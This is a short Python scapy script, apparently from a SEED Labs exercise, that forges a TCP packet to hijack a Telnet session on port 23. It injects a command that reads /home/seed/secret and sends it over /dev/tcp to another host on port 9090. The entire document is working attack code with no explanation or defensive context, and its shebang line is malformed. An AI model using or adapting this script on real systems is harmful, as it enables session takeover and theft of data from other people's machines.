#/usr/bin/python3
import sys
from scapy.all import *
print("SENDING SESSION HIJACKING PACKET.........")
IPLayer = IP(src="172.16.133.130", dst="172.16.133.128")
TCPLayer = TCP(sport=55534, dport=23, flags="A",
seq=2592388664, ack=3257953489)
Data = "\r cat /home/seed/secret >/dev/tcp/172.16.133.129/9090\r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)